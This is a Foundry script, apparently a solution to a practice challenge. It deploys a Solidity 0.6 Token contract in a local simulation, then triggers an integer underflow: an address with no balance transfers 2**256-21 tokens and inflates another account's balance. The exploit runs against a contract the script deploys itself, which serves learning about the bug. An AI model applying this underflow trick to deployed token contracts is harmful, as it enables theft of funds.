// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../src/Token.sol";

contract TokenHack is Script {
    Token public token;
    address public constant eoa = address(1024);

    function run() public {
        vm.deal(eoa, 1 ether);
        vm.startPrank(eoa);
        token = new Token(20);
        console.log("Before, balance of EOA:", token.balanceOf(eoa));
        vm.stopPrank();

        vm.startPrank(address(1023));
        token.transfer(eoa, (2**256 - 21));
        console.log("After, balace of EOA:", token.balanceOf(eoa));
        vm.stopPrank();
    }
}
